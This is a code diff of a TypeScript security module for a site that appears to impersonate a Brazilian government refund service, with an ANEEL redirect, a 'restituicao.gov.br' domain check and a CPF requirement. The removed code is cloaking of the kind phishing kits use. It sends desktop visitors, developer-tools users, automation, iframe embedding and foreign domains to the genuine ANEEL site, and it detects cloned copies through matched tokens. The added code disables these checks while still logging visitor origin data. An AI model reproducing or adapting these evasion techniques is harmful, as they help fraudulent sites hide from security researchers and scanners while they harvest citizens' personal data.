@@ -10,29 +10,12 @@ const ORIGIN_TOKEN_KEY = "origin_validation_token";
 const SESSION_START_KEY = "session_start_timestamp";
 
 /**
- * Verifica se o dispositivo é móvel com base no User Agent
- * Também retorna true para o ambiente Replit para permitir desenvolvimento
+ * Função modificada para sempre retornar true, permitindo acesso tanto de dispositivos móveis quanto desktop
+ * A detecção original foi removida para permitir acesso universal
  */
 export function isMobileDevice(): boolean {
-  // Verificar se estamos no ambiente Replit
-  if (
-    typeof window !== 'undefined' && 
-    (window.location.hostname.includes('replit.dev') || 
-     window.location.hostname.includes('replit.app') ||
-     window.location.hostname.includes('repl.co') ||
-     window.location.hostname === 'localhost' ||
-     window.location.hostname === '0.0.0.0' ||
-     window.location.hostname.includes('127.0.0.1'))
-  ) {
-    return true;
-  }
-
-  const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;
-  
-  const mobileRegex = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i;
-  const tabletRegex = /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i;
-  
-  return !!(mobileRegex.test(userAgent) || tabletRegex.test(userAgent.substring(0, 4)));
+  // Sempre retornar true para permitir acesso de desktop
+  return true;
 }
 
 /**
@@ -54,42 +37,15 @@ function generateSecurityToken(): string {
  * Inicializa ou verifica os tokens de segurança anti-clonagem
  */
 function initAntiCloneProtection(): void {
-  // Verificar se estamos no ambiente Replit - se estiver, não aplicar as restrições de token
-  const isReplitEnv = 
-    typeof window !== 'undefined' && 
-    (window.location.hostname.includes('replit.dev') || 
-     window.location.hostname.includes('replit.app') ||
-     window.location.hostname.includes('repl.co') ||
-     window.location.hostname === 'localhost' ||
-     window.location.hostname === '0.0.0.0' ||
-     window.location.hostname.includes('127.0.0.1'));
-
-  // Verificar se o token de segurança existe
-  let securityToken = localStorage.getItem(SECURITY_TOKEN_KEY);
+  // Esta função foi desabilitada para permitir acesso via desktop
+  // Apenas mantemos o registro da sessão para fins estatísticos
   
-  if (!securityToken) {
-    // Gerar novo token de segurança
-    securityToken = generateSecurityToken();
-    localStorage.setItem(SECURITY_TOKEN_KEY, securityToken);
-    sessionStorage.setItem(SECURITY_TOKEN_KEY, securityToken);
-    document.cookie = `${SECURITY_TOKEN_KEY}=${securityToken}; path=/; max-age=86400`;
-  } else if (!isReplitEnv) {
-    // Verificar se os tokens correspondem (localStorage, sessionStorage e cookies)
-    // Apenas se não estivermos no ambiente Replit
-    const sessionToken = sessionStorage.getItem(SECURITY_TOKEN_KEY);
-    const cookieToken = document.cookie
-      .split('; ')
-      .find(row => row.startsWith(SECURITY_TOKEN_KEY))
-      ?.split('=')[1];
-      
-    // Se algum token não corresponder, pode ser um clone do site
-    if (sessionToken !== securityToken || (cookieToken && cookieToken !== securityToken)) {
-      console.error("Detecção de possível clonagem! Redirecionando...");
-      window.location.href = ANEEL_REDIRECT_URL;
-    }
+  // Iniciar contador de sessão se ainda não foi iniciado
+  if (!sessionStorage.getItem(SESSION_START_KEY)) {
+    sessionStorage.setItem(SESSION_START_KEY, new Date().getTime().toString());
   }
   
-  // Armazenar informações sobre a origem da sessão
+  // Armazenar informações sobre a origem da sessão para estatísticas
   if (!sessionStorage.getItem(ORIGIN_TOKEN_KEY)) {
     const originData = {
       referer: document.referrer || 'direct',
@@ -100,21 +56,7 @@ function initAntiCloneProtection(): void {
     sessionStorage.setItem(ORIGIN_TOKEN_KEY, JSON.stringify(originData));
   }
   
-  // Verificar origem apenas se não estivermos no ambiente Replit
-  if (!isReplitEnv &&
-      window.location.hostname !== 'localhost' && 
-      !window.location.hostname.includes('replit.dev') && 
-      !window.location.hostname.includes('replit.app') && 
-      !window.location.hostname.includes('repl.co') &&
-      !window.location.hostname.includes('restituicao.gov.br')) {
-    console.error("Domínio não autorizado! Redirecionando...");
-    window.location.href = ANEEL_REDIRECT_URL;
-  }
-  
-  // Iniciar contador de sessão se ainda não foi iniciado
-  if (!sessionStorage.getItem(SESSION_START_KEY)) {
-    sessionStorage.setItem(SESSION_START_KEY, new Date().getTime().toString());
-  }
+  console.log("Proteção anti-clone desativada para permitir acesso por desktop.");
 }
 
 /**
@@ -182,20 +124,10 @@ function setupDomProtection(): void {
  * Detecta tentativas de inspeção e ferramentas de desenvolvedor com métodos avançados
  */
 export function setupDevToolsDetection(): void {
-  // Verificar se estamos no ambiente Replit - se estiver, não aplicar as restrições
-  const isReplitEnv = 
-    typeof window !== 'undefined' && 
-    (window.location.hostname.includes('replit.dev') || 
-     window.location.hostname.includes('replit.app') ||
-     window.location.hostname.includes('repl.co') ||
-     window.location.hostname === 'localhost' ||
-     window.location.hostname === '0.0.0.0' ||
-     window.location.hostname.includes('127.0.0.1'));
-     
-  if (isReplitEnv) {
-    console.log("Ambiente de desenvolvimento detectado. Desativando verificações de ferramentas de desenvolvedor.");
-    return;
-  }
+  // Desabilitamos todas as verificações de ferramentas de desenvolvedor
+  // para permitir acesso via desktop e testes de desenvolvedores
+  console.log("Verificações de ferramentas de desenvolvedor desativadas para permitir acesso por desktop.");
+  return;
   
   // Função para redirecionar
   const redirectToAneel = () => {
@@ -349,20 +281,10 @@ export function setupDevToolsDetection(): void {
  * Proteção contra scripts ou ferramentas de automação/scraping
  */
 function setupAntiAutomationProtection(): void {
-  // Verificar se estamos no ambiente Replit - se estiver, não aplicar as restrições
-  const isReplitEnv = 
-    typeof window !== 'undefined' && 
-    (window.location.hostname.includes('replit.dev') || 
-     window.location.hostname.includes('replit.app') ||
-     window.location.hostname.includes('repl.co') ||
-     window.location.hostname === 'localhost' ||
-     window.location.hostname === '0.0.0.0' ||
-     window.location.hostname.includes('127.0.0.1'));
-     
-  if (isReplitEnv) {
-    console.log("Ambiente de desenvolvimento detectado. Desativando verificações anti-automação.");
-    return;
-  }
+  // Desabilitamos completamente as verificações anti-automação
+  // para permitir acesso via desktop
+  console.log("Verificações anti-automação desativadas para permitir acesso por desktop.");
+  return;
 
   // Verifica comportamento errático do cursor que pode indicar automação
   let lastMouseX = 0;
@@ -416,21 +338,7 @@ function setupAntiAutomationProtection(): void {
     }
   }, 5000);
   
-  // Adicionar proteção contra navegação via iframe
-  try {
-    // Verificar se estamos no ambiente Replit antes de aplicar a proteção
-    if (!isReplitEnv && window.self !== window.top) {
-      const topWindow: Window | null = window.top;
-      if (topWindow) {
-        topWindow.location.href = ANEEL_REDIRECT_URL;
-      }
-    }
-  } catch (e) {
-    // Uma exceção pode ocorrer ao tentar acessar window.top devido a restrições de domínio cruzado
-    if (!isReplitEnv) {
-      window.location.href = ANEEL_REDIRECT_URL;
-    }
-  }
+  // Código de proteção contra iframe foi removido para permitir acesso em desktop
 }
 
 /**
@@ -450,11 +358,7 @@ export function requireCpf(userData: any, navigate: (path: string) => void): boo
  * Realiza todas as verificações de segurança na inicialização
  */
 export function initializeSecurity(): void {
-  // Verificar se é mobile e redirecionar se não for
-  if (!isMobileDevice()) {
-    window.location.href = ANEEL_REDIRECT_URL;
-    return;
-  }
+  // Removida verificação de dispositivo móvel para permitir acesso via desktop
   
   console.log("Inicializando segurança...");
   
